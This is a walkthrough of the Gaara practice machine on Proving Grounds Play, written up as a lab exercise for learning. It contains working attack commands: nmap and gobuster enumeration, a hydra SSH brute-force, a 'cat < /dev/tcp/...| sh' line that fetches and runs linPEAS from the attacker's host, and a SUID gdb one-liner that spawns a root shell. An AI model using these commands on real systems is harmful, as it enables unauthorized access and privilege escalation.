# $\color{Magenta}{Proving\ Grounds\ Play:\ Gaara\ Walkthrough}$
## $\color{Magenta}{Pentest\ performed\ in\ the\ Gaara\ machine\ on\ Proving\ Grounds\ Play.}$

### $\color{Cyan}{Scanning}$

As always, I started with a **nmap** scan to gather information about the system’s open ports.

```
nmap -sS -sV <machine ip>
```

![1_4fXNgTLaHZsTV6Mf43To9A](https://github.com/user-attachments/assets/081ed141-dede-4e12-b7c1-e013fa09c887)


The scan showed two ports:

- **80 (HTTP).** A website.
- **22 (SSH).** Remote access to a computer.

### $\color{Cyan}{Enumeration}$

When I searched the ip I found the following website:

![1_KxiJJ1hkZ3AbGJStI1kxBg](https://github.com/user-attachments/assets/dccc8f0b-acac-4cdf-a816-33906c1360a3)


Just in case, I inspected the web and view its source code, but I found nothing. Because of this, my next step was enumerating with **dirb** (which showed nothing) and **gobuster**:

```
gobuster dir -u <URL> -w <path to wordlist>
```

![1_c05QZ2LokWztcVmtEp0b1A](https://github.com/user-attachments/assets/51076dd1-c267-4fb1-860f-7bd21874d587)


In this case there was a directory called **Cryoserver,** which mentioned another three sub-directories (can be seen at the bottom of the page or viewing its source code):

- **Temari.**
- **Kazekage.**
- **iamGaara.**
    
![1_XW4W1bUWoIwGgvd9EJ7RqQ](https://github.com/user-attachments/assets/d9c239d2-5e4a-4c4d-a7ce-2a90b662ce94)

![1_0D942coMAUywiVF_7IJcuA](https://github.com/user-attachments/assets/f36d8e0e-d5f9-4cea-94c0-a5542be24cfe)


### $\color{Cyan}{Password Cracking}$

In the **iamGaara** sub-directory I finally found a weird string: **f1MgN9mTf9SNbzRygcU**

![1_XUZXOh3bMekraDTqzHb0-Q](https://github.com/user-attachments/assets/e77ae384-d2a7-41d5-9037-22874f8a3fe8)


To identify the code used to cipher the message I used an [encrypted message identifier](https://www.dcode.fr/cipher-identifier), which showed:

![1_RBdGEfF52m5NAS--OphgQg](https://github.com/user-attachments/assets/fb343be2-e314-4add-ba88-afab94ad27ec)

So, in [cyberchef](https://gchq.github.io/CyberChef/#recipe=Bcrypt(1)&input=JDJ5JDEyJER3dDFCWmo2cGN5YzNEeTFGV1o1aWVlVXpucjcxRWVOa0prVWx5cFRzZ2JYMUg2OHdzUm9t), I cracked the message with Base 58 obtaining this text: **gaara:ismyname.**

### $\color{Cyan}{SSH}$

Due to not being able to obtain more information from the website, I concluded that this message was the username and password for **SSH**. However, although the username was correct, ismyname wasn’t the password (it was just indicating that **gaara** was the username).

I had to know the password, so my next step was brute-forcing the **SSH** password with **hydra**.

To do this, I executed the following command:

```
hydra -l gaara -P <path to wordlist> <ip> ssh -t 4  
```

![1_j01NU9ZQ5nCXj54CUfroiQ](https://github.com/user-attachments/assets/29ed7d8f-a075-4c1e-8f87-5bf0469f3f27)

With these credential I was finally able to enter.

And, with a simple *“ls”* and *“cat”*, I got the first flag.

### $\color{Cyan}{Privilege Escalation}$

The last step was the privilege escalation.

First, I executed *“sudo -l”* to know the commands my user had access, but they didn’t have sudo privileges.

This left me with the **SUID** bit search, which was easily done with the script [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

**👉🏿 SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it**.

This script not only search binaries and indicates the ones with the **SUID** bit, it also shows certificates, ssh files, crontab files… To use it you have to:

- Download the executable: `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
- Send the script to the victim and execute it:
    - On the host: `sudo nc -q 5 -lvnp <port number>` < [linpeas.sh](http://linpeas.sh/)
    - On the victim: `cat < /dev/tcp/<yout ip>/<port number> | sh` (with this command, the output is shown in the victim shell).

Thanks to this script I saw the file **/gdb**, which had **SUID** permissions.

![1_zo--gaAkTWtJIOIZc5kLQQ](https://github.com/user-attachments/assets/0b0fac86-e457-449b-83b4-2849f9911b46)

To exploit it and to become root, I searched in [GTFOBins](https://gtfobins.github.io/):

**👉🏿 GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.**


```
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

![1_T06hruVGu7JssjrJYz57gw](https://github.com/user-attachments/assets/c45efb14-4e93-45cd-b01b-eabc1d8086a8)

Executing that command I became root and got the flag.
